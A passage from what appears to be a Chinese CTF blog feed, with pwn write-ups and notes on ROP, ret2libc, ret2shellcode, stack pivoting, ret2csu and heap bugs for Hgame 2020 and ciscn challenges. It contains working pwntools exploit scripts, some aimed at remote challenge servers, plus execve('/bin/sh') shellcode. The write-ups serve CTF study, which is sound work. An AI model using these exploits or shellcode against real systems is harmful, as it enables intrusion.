sh.sendline(&quot;1&quot;)    sh.recvuntil(&quot;Password.&quot;)    payload = cyclic(0x40 + 8)    payload += p64(pop_rdi)    payload += p64(binsh)    payload += p64(system)    #pause()    sh.sendline(payload)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;123.206.21.178&quot;,10000,0)</code></pre><blockquote><p><a href="https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#_9" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/#_9</a></p><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而 libc 在github上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p><ul><li><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘/bin/sh’)</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn_by_examples</title>
    <link href="/2020/01/28/pwn_by_examples/"/>
    <url>/2020/01/28/pwn_by_examples/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn-by-examples"><a href="#pwn-by-examples" class="headerlink" title="pwn_by_examples"></a>pwn_by_examples</h1><p>x64参数按在rdi,rsi,rdx,rcs,r8,r9依次储存</p><h2 id="IDA部分"><a href="#IDA部分" class="headerlink" title="IDA部分"></a>IDA部分</h2><p>shift f12 字符串</p><p>n 重命名</p><p>x 查看引用</p><h2 id="bash部分"><a href="#bash部分" class="headerlink" title="bash部分"></a>bash部分</h2><pre><code class="bash">cyclic 200 #生成循环 200个cyclic -l xxxxx #计算偏移</code></pre><h2 id="PWNTOOLS部分"><a href="#PWNTOOLS部分" class="headerlink" title="PWNTOOLS部分"></a>PWNTOOLS部分</h2><pre><code>u64 asm disasm </code></pre><pre><code class="python">from pwn import *sh = process(&#39;./ret2libc2&#39;)elf = ELF(&#39;./ret2libc2&#39;)rop = ROP(elf)payload = &#39;a&#39; * offsetpayload += p32(elf.plt[&#39;gets&#39;])payload += p32(rop.search(8).address)payload += p32(elf.bss() + 0x100)payload += p32(elf.plt[&#39;system&#39;])payload += p32(0)payload += p32(elf.bss() + 0x100)sh.sendline(payload)sh.sendline(&#39;/bin/sh\x00&#39;)sh.interactive()</code></pre><p>先执行了pop_ret 然后执行gets，并放到了bss()+ 0x100的地方。随后system(elf.bss()+ 0x100)</p><h2 id="pwndbg部分"><a href="#pwndbg部分" class="headerlink" title="pwndbg部分"></a>pwndbg部分</h2><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>jmp esp</p><p>函数返回的时候esp会刚好指向返回地址的下一个地址</p><img src="/2020/01/28/pwn_by_examples/image-20200125172524547.png" srcset="/img/loading.gif" class="" title="image-20200125172524547"><hr><blockquote><p>作者：看雪学院<br>链接：<a href="https://www.jianshu.com/p/1bdac9837eff" target="_blank" rel="noopener">https://www.jianshu.com/p/1bdac9837eff</a><br>来源：简书</p></blockquote><h2 id="第一题（堆栈直接执行shellcode）"><a href="#第一题（堆栈直接执行shellcode）" class="headerlink" title="第一题（堆栈直接执行shellcode）"></a>第一题（堆栈直接执行shellcode）</h2><p>接下来这题，我们再轻松一点，可以直接在堆栈中执行程序。</p><p>pwn5（参考“阅读原文”）</p><p>继续前面的套路。</p><p><strong>第一步，查看保护</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-41da81266dc47fff?imageMogr2/auto-orient/strip%7CimageView2/2/w/644/format/webp" srcset="/img/loading.gif" alt="img"></p><p>发现，可以直接在堆栈上执行程序了，开启的是PIE，地址随机化的保护。</p><p><strong>第二步，判断漏洞函数。</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-8b1062016fc33b8b?imageMogr2/auto-orient/strip%7CimageView2/2/w/480/format/webp" srcset="/img/loading.gif" alt="img"></p><p>发现函数是read，仅仅读取0x40（64）个字节。</p><p><strong>第三步，计算目标变量的在堆栈中距离ebp的偏移</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-14fee87811eb443d?imageMogr2/auto-orient/strip%7CimageView2/2/w/388/format/webp" srcset="/img/loading.gif" alt="img"></p><p>EBP的内容为：0x3761413661413561</p><blockquote><p>$ python patternLocOffset.py -l 700 -s 0x3761413661413561</p><p>[*] Create pattern string contains 700 characters ok!</p><p>[*] No exact matches, looking for likely candidates…</p><p>[+] Possible match at offset 16 (adjusted another-endian)</p><p>[+] take time: 0.0005 s</p></blockquote><p>距离EBP的偏移是16个字节，距离存放的返回地址是16+8=24个字节。</p><p>这里可以发现IDA分析的又是正确的了，0x10个字节。</p><p><strong>第四步和第五步，分析是否已经载入了可以利用的函数</strong></p><p>如system，execve等</p><p>发现，并没有上述函数。但是由于堆栈可以执行，因此我们可以考虑直接将shellcode阻止在payload里面。因此，这里和第五步分析是否有字符串/bin/sh合并了，我们可以自己放置字符串，并且调用对应的地址了。</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-15f527ac95286278?imageMogr2/auto-orient/strip%7CimageView2/2/w/448/format/webp" srcset="/img/loading.gif" alt="img"></p><p>理论上，我们可以直接利用pwntools产生的shellcode来进行部署，但是这道题有点特殊。在返回地址之后所剩余的空间=64-24-8=32个字节（返回地址还要占用8个字节），因此实际部署shellcode的长度还剩下32个字节，使用pwntools产生的shellcode有44个字节，太长了。因此，我们可以从网上找到更短的shellcode：</p><blockquote><p># 23 bytes</p><p># <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a></p><p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p></blockquote><p>它的汇编形式是：</p><blockquote><p># char *const argv[]</p><p>xorl %esi, %esi</p><p>#</p><p> ‘h’ ‘s’ ‘/‘ ‘/‘ ‘n’ ‘i’ ‘b’ ‘/‘</p><p>movq $0x68732f2f6e69622f, %rbx</p><p>#</p><p> for ‘\x00’</p><p>pushq %rsi</p><p>pushq %rbx</p><p>pushq %rsp</p><p>#</p><p> const char *filename</p><p>popq %rdi</p><p>#</p><p> __NR_execve 59</p><p>pushq $59</p><p>popq %rax</p><p>#</p><p> char *const envp[]</p><p>xorl %edx, %edx</p><p>syscall</p></blockquote><p>好了，shellcode确定好了，我们现在还有一个问题。Shellcode执行的地址如何确定呢？shellcode的地址，其实就是buf的地址加上32个字节的偏移。</p><p>我们前面发现，该程序是动态改变地址的，因此静态的确认buf地址是不可行的，进而静态的确认shellcode的地址是不可行的。</p><p>处理到这里好像有点死胡同了，我们发现程序中有printf函数，理论上可以利用它来打印buf的地址，然后实时的计算buf+32的地址，就能够得到shellcode的地址。但是，我们回头看看程序本身的执行，会发现：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-e928c61d7e0eba62?imageMogr2/auto-orient/strip%7CimageView2/2/w/729/format/webp" srcset="/img/loading.gif" alt="img"></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-6fa118c955729fc4?imageMogr2/auto-orient/strip%7CimageView2/2/w/506/format/webp" srcset="/img/loading.gif" alt="img"></p><p>它实际上已经为我们解决了这个问题，自己输出了buf的地址（= = CTF题目的难易程度真的是微妙之间呀）。</p><p>那么，我们的exp思路就是： 实时读取buf的地址，计算buf+32得到shellcode的地址，放置在payload中。</p><blockquote><p>from pwn import *</p><p>code = ELF(‘./pwn5’)</p><p># 23 bytes</p><p># <a href="https://www.exploit-db.com/exploits/36858/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36858/</a></p><p>shellcode_x64 = “\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p><p>sh.recvuntil(‘[‘)</p><p>buf_addr = sh.recvuntil(‘]’, drop=True)</p><p>buf_addr = int(buf_addr, 16)</p><p>payload = ‘b’ * 24 + p64(buf_addr + 32) + shellcode_x64</p><p>sh.sendline(payload)</p><p>sh.interactive()</p></blockquote><p>堆栈的布置图，以及地址的相对位置，以buf为起点。</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-bb20383a152f69a1?imageMogr2/auto-orient/strip%7CimageView2/2/w/699/format/webp" srcset="/img/loading.gif" alt="img"></p><p>第二题（控制esp进行精准打击）</p><p>接下来，我们来点有难度的。在这个程序中，我们的payload实在放不下了，即使是23字节，那么怎么办呢？</p><p>pwn6（参考“阅读原文”）</p><p>继续前面的过程：</p><p><strong>第一步：检测保护情况</strong></p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-803630bd28a73fb7?imageMogr2/auto-orient/strip%7CimageView2/2/w/520/format/webp" srcset="/img/loading.gif" alt="img"></p><p>发现，是个三无程序。么有任何保护，看起来很简单？哈哈，并没有。看官请继续。</p><p><strong>第二步，判断漏洞函数</strong></p><p>如gets,scanf等：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-4208fca26260a9d6?imageMogr2/auto-orient/strip%7CimageView2/2/w/313/format/webp" srcset="/img/loading.gif" alt="img"></p><p>发现是fgets函数，仅仅读取50个字节的字符长度。</p><p><strong>第三步</strong></p><p>计算目标变量的在堆栈中距离ebp的偏移。</p><p>方法和前面类似，发现偏移距离ebp是0x20，那么距离ret_addr就是0x20+4=0x24（36）字节了。</p><p><strong>第四步和第五步</strong></p><p>分析是否已经载入了可以利用的函数。发现并没有：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-ec80829673fdb148?imageMogr2/auto-orient/strip%7CimageView2/2/w/461/format/webp" srcset="/img/loading.gif" alt="img"></p><blockquote><p>$ ROPgadget –binary stack_pivoting_1 –string ‘/bin/sh’</p><p>Strings information</p><p>============================================================</p></blockquote><p>字符串自然也是没有的。</p><p>我们考虑利用shellcode，好像可以类似于上一题的操作了。但是并不能，留给我们布置shellcode的长度为50-36-4=10字节（同样有4个字节的返回地址存放）！尴尬不==，放两个地址就没有位置了。但如果你能够厉害到用10个字节做shellcode，请大胆分享出来！</p><p>那么怎么办呢？</p><p>既然，堆栈溢出的位置不行了，那么我们就把shellcode放在栈里面吧！因为堆栈具有可执行的权限，因此这样完全是可行的。</p><p>这里，我先放图出来解释一下思路：</p><p><img src="https:////upload-images.jianshu.io/upload_images/4238783-605a219a5314b46c?imageMogr2/auto-orient/strip%7CimageView2/2/w/679/format/webp" srcset="/img/loading.gif" alt="img"></p><p>我们这样就总共有0x20（36个字节）的位置存放shellcode的了，顿时感觉找到了新出路。但是，要做到跳转到放置shellcode的位置，似乎并没有那么简单。要达到这个目的，我们需要做到以下几件事情：</p><p>推算shellcode放置的地址</p><p>跳转到shellcode放置的位置</p><p>首先，第一点，shellcode的位置就是发射payload的时候esp_old的位置，我们可以推算出来，当程序提取完返回地址之后，esp指向的地址距离esp_old的地址为0x20+4(ebp)+4(ret_addr)=0x28。因此，我们需要用当前的esp-0x28，得到的就是shellcode的地址。</p><p>对于第二点，我们如何让eip顺利的依次取出我们设计好的路线图呢？在ret_addr，我们需要寻找到一个gadget，它能够跳转到esp的位置，以继续往后执行栈上的代码。注意，这里我们为什么不直接将可执行的代码布置在ret_addr的位置，因为这里是原本的函数提取返回函数地址的地方，它并不会执行这里位置的代码，而是执行这个位置的内容指向的地址的代码。我们需要jmp esp这个操作，来让程序流获得在栈上执行的先河。</p><blockquote><p>$ ROPgadget –binary stack_pivoting_1 –only ‘jmp|ret’ | grep ‘esp’</p><p>0x08048504 : jmp esp</p></blockquote><p>发现只有这么一个地址。0x08048504。这也正是图中的位置。注意，当我们取出ret_addr里面的地址的时候，esp已经+4了，因此就会指向我们的下一步操作：跳转回esp_old的位置。</p><p>在这里，我们直接可以选择让pwntools产生可执行的代码”sub  esp 0x28; jmp esp”。注意，这里可以是直接运行的代码，因为我们的程序已经开始在栈上执行了，而不再是取出地址了。</p><p>最后的EXP按照下面这样布置：</p><blockquote><p>from pwn import *</p><p>sh = process(‘./pwn6’)</p><p>shellcode_x86 = “\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73”</p><p>shellcode_x86 += “\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0”</p><p>shellcode_x86 += “\x0b\xcd\x80”</p><p>sub_esp_jmp = asm(‘sub esp, 0x28;jmp esp’)</p><p>jmp_esp = 0x08048504</p><p>payload = shellcode_x86 + (</p><p>0x20 - len(shellcode_x86)) * ‘b’ + ‘bbbb’ + p32(jmp_esp) + sub_esp_jmp</p><p>sh.sendline(payload)</p><p>sh.interactive()</p></blockquote><p>注意，这里我们又启用了另外一段代码：</p><p>它更加短，只有21个字节。Shellcode越短是越好的。它的汇编对应如下：</p><blockquote><p>shellcode_x86 = “\x31\xc9”          # xor   ecx, ecx</p><p>shellcode_x86 += “\xf7\xe1”       # mul   ecx</p><p>shellcode_x86 += “\x51”       # push  ecx</p><p>shellcode_x86 += “\x68\x2f\x2f\x73\x68” # push 0x68732f2f</p><p>shellcode_x86 += “\x68\x2f\x62\x69\x6e” # push 0x6e69622f </p><p>shellcode_x86 += “\x89\xe3”       # mov   ebx, esp</p><p>shellcode_x86 += “\xb0\x0b”       # moval, 0xb</p><p>shellcode_x86 += “\xcd\x80” # int 0x80</p></blockquote><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>1、编辑功能是否存在溢出</p><p>2、delete地方是否存在多重释放漏洞，删除了节点之后有没有清0</p><p>​    检查了节点是否存在，就不能double free</p><p>​    heaparray[v1] = 0LL 清零了</p><p>3、在show函数中有没有检查节点是否存在</p><p>v0[1] = malloc(size) 没有对大小限制也算漏洞</p><p>只有分配大小不能被2*sizeof(size_t)时才会把下一块chunk的prev_size当作自己的内容区域</p><h3 id="off-by-one-漏洞"><a href="#off-by-one-漏洞" class="headerlink" title="off by one 漏洞"></a>off by one 漏洞</h3><p><strong>要使用off by one，malloc大小不能是16的倍数（64位情况下）</strong></p><p>read_input(*(headparray[v1] + 1), *heaparray[v1] + 1LL);</p><p>能够修改下一块chunk的size字段，这种情况一般被称为堆扩展技术</p><img src="/2020/01/28/pwn_by_examples/image-20200126175331744.png" srcset="/img/loading.gif" class="" title="image-20200126175331744"><img src="/2020/01/28/pwn_by_examples/image-20200126175341238.png" srcset="/img/loading.gif" class="" title="image-20200126175341238"><img src="/2020/01/28/pwn_by_examples/image-20200126181904887.png" srcset="/img/loading.gif" class="" title="image-20200126181904887">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
      <category>教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hgame</title>
    <link href="/2020/01/28/Hgame/"/>
    <url>/2020/01/28/Hgame/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2020"><a href="#Hgame2020" class="headerlink" title="Hgame2020"></a>Hgame2020</h1><h2 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h2><img src="/2020/01/28/Hgame/image-20200116233004577.png" srcset="/img/loading.gif" class="" title="image-20200116233004577"><img src="/2020/01/28/Hgame/image-20200116233016869.png" srcset="/img/loading.gif" class="" title="image-20200116233016869"><p>V5在-0x31，s在-0xAC</p><pre><code class="python">sh.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)payload=&quot;a&quot;*(0xAC - 0x31)payload += &#39;0O0o\x00O0&#39;sh.send(payload)sh.interactive()</code></pre><h2 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h2><img src="/2020/01/28/Hgame/image-20200117005607628.png" srcset="/img/loading.gif" class="" title="image-20200117005607628"><img src="/2020/01/28/Hgame/image-20200117005622807.png" srcset="/img/loading.gif" class="" title="image-20200117005622807"><p>0xE0 - 0xC0之后刚好是32位，这样第</p><pre><code class="python">payload = cyclic(0xE0 - 0xC0)sh.send(payload)sh.recvuntil(&quot;shot!\n&quot;)payload = str(6295776)sh.send(payload)</code></pre><h2 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h2><h2 id="open-read-puts"><a href="#open-read-puts" class="headerlink" title="open_read_puts"></a>open_read_puts</h2><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./ROP_LEVEL0&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./ROP_LEVEL0&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)        #lib = ELF(&#39;./home/robye/Desktop/PWN/libc/64-libc-2.27.so&#39;)    pop_rsi_r15_ret = 0x400751     pop_rdi_ret = 0x400753    buf = 0x601060    open_plt = elf.plt[&#39;open&#39;]    open_addr = 0x4006A3    payload = cyclic(0x50+ 8)    payload += p64(pop_rsi_r15_ret)    payload += p64(elf.bss()+0x100)    payload += p64(0xdeadbeef)    payload += p64(elf.plt[&#39;read&#39;])    payload += p64(pop_rdi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(pop_rsi_r15_ret)    payload += p64(0)    payload += p64(0)    payload += p64(elf.plt[&#39;open&#39;])    payload += p64(pop_rdi_ret)    payload += p64(6)    payload += p64(pop_rsi_r15_ret)    payload += p64(elf.bss()+0x100)    payload += p64(0)    payload += p64(elf.plt[&#39;read&#39;])    payload += p64(pop_rdi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(0x4004e0)#puts_plt    sh.sendline(payload)    sleep(0.5)    sh.recvuntil(&quot;./flag&quot;)    sh.send(&quot;./flag\x00&quot;)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;47.103.214.163&quot;,20003,1 )</code></pre><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><img src="/2020/01/28/Hgame/image-20200117183339217.png" srcset="/img/loading.gif" class="" title="image-20200117183339217"><p>ROP_LEVEL0| SOLVED| ww        <img src="/2020/01/28/Hgame/92YAf7bVfc8a3fUf__thumbnail" srcset="/img/loading.gif" class="" title="img">      重复利用此处的gadget调用read， open， puts将flag输出就行</p><pre><code class="python"> 1 #!/usr/bin/python2  2   3 from pwn import *  4 import sys  5 import os  6   7 #context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])  8 context(arch=&#39;i386&#39;, os=&#39;linux&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])  9 context.log_level=&#39;debug&#39; 10 debug = 0 11 d = 1 12  13 def pwn(): 14     execve = &quot;./ROP_LEVEL0&quot; 15     if debug == 1: 16         p = process(execve) 17         if d == 1: 18             gdb.attach(p) 19     else: 20         #ip = &quot;10.0.%s.140&quot; % sys.argv[1] 21         ip = &quot;47.103.214.163&quot; 22         host = &quot;20003&quot; 23         p = remote(ip, host) 24  25     elf = ELF(&quot;./ROP_LEVEL0&quot;) 26  27     main = 0x40065B 28     loc1 = 0x400730 29     loc2 = 0x40074A 30  31     payload = &#39;\x00&#39;*(0x50+8) + p64(loc2) 32     payload += p64(0) + p64(1) + p64(elf.got[&#39;read&#39;]) + p64(0x10) + p64(elf.bss()+0x200) + p64(0) + p64(loc1) 33     payload += p64(0)*7 + p64(main) 34     p.sendafter(&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;, payload.ljust(0x100, &#39;\x00&#39;)) 35  36     p.sendline(&#39;./flag\0&#39;) 37  38     payload = &#39;\x00&#39;*(0x50+8) + p64(loc2) 39     payload += p64(0) + p64(1) + p64(elf.got[&#39;open&#39;]) + p64(0)*2 + p64(elf.bss()+0x200) + p64(loc1) 40     payload += p64(0)*7 + p64(main) 41     p.sendafter(&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;, payload.ljust(0x100, &#39;\x00&#39;)) 42  43     raw_input() 44     payload = &#39;\x00&#39;*(0x50+8) + p64(loc2) 45     payload += p64(0) + p64(1) + p64(elf.got[&#39;read&#39;]) + p64(0x60) + p64(elf.bss()+0x220) + p64(5) + p64(loc1) 46     payload += p64(0)*7 + p64(main) 47     p.sendafter(&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;, payload.ljust(0x100, &#39;\x00&#39;)) 48  49     payload = &#39;\x00&#39;*(0x50+8) + p64(loc2) 50     payload += p64(0) + p64(1) + p64(elf.got[&#39;puts&#39;]) + p64(0)*2 + p64(elf.bss() + 0x220) + p64(loc1) 51     payload += p64(0)*7 + p64(main) 52     p.sendafter(&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;, payload.ljust(0x100, &#39;\x00&#39;)) 53  54     p.interactive() 55  56 if __name__ == &#39;__main__&#39;: 57     pwn()</code></pre><p><a href="http://www.qfrost.com:4000/PWN/万能gadget/" target="_blank" rel="noopener">http://www.qfrost.com:4000/PWN/%E4%B8%87%E8%83%BDgadget/</a></p><h2 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void) {     //char str[20];    long str = 0x40078d;    long temp;    long number = 4196237L;    char string[20];    temp = atol(str);    printf(&quot;十进制：%d&quot;,str);    //printf(&quot;转换前：%s ,转换后：%d\n&quot;,str,atol(str));    temp = number;    itoa(number, string, 16);    //printf(&quot;转换前：%d,转换后：%s&quot;,temp,string);    return 0;}</code></pre><img src="/2020/01/28/Hgame/image-20200127180305749.png" srcset="/img/loading.gif" class="" title="image-20200127180305749"><img src="/2020/01/28/Hgame/image-20200127180319641.png" srcset="/img/loading.gif" class="" title="image-20200127180319641"><img src="/2020/01/28/Hgame/image-20200127180517996.png" srcset="/img/loading.gif" class="" title="image-20200127180517996"><img src="/2020/01/28/Hgame/image-20200127180441992.png" srcset="/img/loading.gif" class="" title="image-20200127180441992"><p>没有NX加上有jump rsp，那就肯定ret2shellcode</p><p>因为atoll，所以不能直接发shellcode</p><p>先看一下偏移</p><pre><code class="python">for i in range(20):    sh.sendline(str(i))    sleep(0.1)</code></pre><img src="/2020/01/28/Hgame/image-20200127181655275.png" srcset="/img/loading.gif" class="" title="image-20200127181655275"><p>看见c,d,e,f,那里，再测一次</p><pre><code class="python">for i in range(1,13):    sh.sendline(str(i))    sleep(0.1)</code></pre><img src="/2020/01/28/Hgame/image-20200127184537470.png" srcset="/img/loading.gif" class="" title="image-20200127184537470"><p>现在我们还看见了一个1，可能是用来记录循环次数的？</p><p>然后我们要构建栈，就得按照</p><pre><code class="python">gadget = [        0,        0x000000000040078D,#jmp rsp        0x622fbf4856f63148,#shellcode        0x545768732f2f6e69,        0x0000050f993bb05f,]</code></pre><p>这样来构建</p><blockquote><img src="/2020/01/28/Hgame/image-20200127191618340.png" srcset="/img/loading.gif" class="" title="image-20200127191618340"></blockquote><img src="/2020/01/28/Hgame/image-20200127193319645.png" srcset="/img/loading.gif" class="" title="image-20200127193319645"><p>这样我们看见那个0，好像放在了最下面，并且栈中还存留有56789a，所以把gadget修改一下</p><pre><code class="python">gadget = [        0xdeadbeef,        0x000000000040078D,#jmp rsp        0x622fbf4856f63148,#shellcode        0x545768732f2f6e69,        0x0000050f993bb05f,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,]</code></pre><img src="/2020/01/28/Hgame/image-20200127194207809.png" srcset="/img/loading.gif" class="" title="image-20200127194207809"><p>这样就没有问题啦，然后就是如何退出循环了</p><p>这里我们可以看见循环次数已经变成了b<img src="/2020/01/28/Hgame/image-20200127195248873.png" srcset="/img/loading.gif" class="" title="image-20200127195248873"></p><p>但如果我们继续发送的话，又会变成1<img src="/2020/01/28/Hgame/image-20200127200302561.png" srcset="/img/loading.gif" class="" title="image-20200127200302561"></p><p>经过调试之后，只有<code>sendNum((11&lt;&lt;32))</code>可以将b+1变成c，否则会重新开始循环打乱栈内布局</p><p>随后，发送</p><pre><code class="python">for i in range(12,20):    sendNum(i)</code></pre><img src="/2020/01/28/Hgame/image-20200127202553944.png" srcset="/img/loading.gif" class="" title="image-20200127202553944"><p>然后发现立马就可以运行第一行…..</p><p>我们需要把rbp指针指向之前我们放好了的地方，所以计算一下栈偏移，然后</p><pre><code class="python">a = asm(&#39;sub rsp,0x60;ret&#39;)b = disasm(a)</code></pre><img src="/2020/01/28/Hgame/image-20200127205156957.png" srcset="/img/loading.gif" class="" title="image-20200127205156957"><p>所以发送<code>sendNum(0xc360ec8348)</code>再使用gitf里的<img src="/2020/01/28/Hgame/image-20200127205325792.png" srcset="/img/loading.gif" class="" title="image-20200127205325792"></p><p>完成跳转</p><p>随后，程序还需要读入六个数，然后即可</p><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;sh = process(&quot;./Number_Killer&quot;)sh.recvuntil(&quot;numbers!\n&quot;)gadget = [        0xdeadbeef,        0x000000000040078D,#jmp rsp        0x622fbf4856f63148,#shellcode        0x545768732f2f6e69,        0x0000050f993bb05f,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,]def sendNum(num):    sh.sendline(str(num))    sleep(0.1)for i in range(11):    sh.sendline(str(i))    sleep(0.1)for i in gadget:    sendNum(i)#pause()sendNum((11&lt;&lt;32))pause()sendNum(0xc360ec8348)sendNum(0x400789)for i in range(6):    sh.sendline(str(i))    sleep(0.1)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Hgame</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_s_9</title>
    <link href="/2020/01/25/ciscn_2019_s_9/"/>
    <url>/2020/01/25/ciscn_2019_s_9/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h1><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122128279.png" srcset="/img/loading.gif" class="" title="image-20200124122128279"><p>啥保护没开，第一时间考虑shellcode</p><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122202333.png" srcset="/img/loading.gif" class="" title="image-20200124122202333"><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122235034.png" srcset="/img/loading.gif" class="" title="image-20200124122235034"><p>另外leak只有50，leak多才考虑直接走rop</p><img src="/2020/01/25/ciscn_2019_s_9/image-20200124122303684.png" srcset="/img/loading.gif" class="" title="image-20200124122303684"><p>尝试过ret2libc,但是怎么都调不出来= =</p><pre><code class="python">shellcode =&#39;&#39;&#39;xor    eax,eaxpush   eaxpush   0x68732f2f #//shpush   0x6e69622f # /binmov    ebx,espmov    ecx,eaxmov    edx,eaxmov    al,0xbint    0x80xor    eax,eaxinc    eaxint    0x80&#39;&#39;&#39;shellcode =asm(shellcode) #使用shellcraft.sh打不通，估计是因为太长了shell=&quot;sub esp,0x28;call esp&quot;shell =asm(shell)sh.recvuntil(&quot;&gt;\n&quot;)payload = shellcode.ljust(0x24,&quot;\x00&quot;)payload += p32(0x8048554) #jmp esppayload += shellpause()sh.sendline(payload)</code></pre><blockquote><p>（1）xorl %eax,%eax ：使用xor指令清空eax，即使eax=0，不可以使用movl 0,%eax，因为会在shellcode中引入’0’，一些存在bufferoverflow的函数，如strcpy()，都是在源字符串中检测’0’，若遇到‘0’，默认为字符串结束，则之后的字符串不会被拷贝。<br>（2）pushl %eax ：将0入栈，标记了”/bin/sh”的结尾，用pushl也可以避免在shellcode中引入’0’<br>（3）pushl 0x68732f2f：传递”/sh”，为了4字节对齐，使用//sh，这在execve()中等同于/sh<br>（4）pushl ​0x6e69622f：传递“/bin”，为4个字节。<br>（5）movl %esp,%ebx ：此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx<br>（6）pushl %eax<br>        pushl %ebx ：在栈中构造Name数组，ebx存储了”/bin/sh”字符串的地址，eax中为0，作为Name[1]；<br>（7）movl %esp,%ecx :esp指向构造的Name数组，将其保存在ecx中<br>（8）cdq ：清空edx，edx中存放环境变量，0代表不传递环境变量，也可以使用xorl %edx %edx,但是该指令更长。<br>（9）movb $0x0b,%al<br>         int 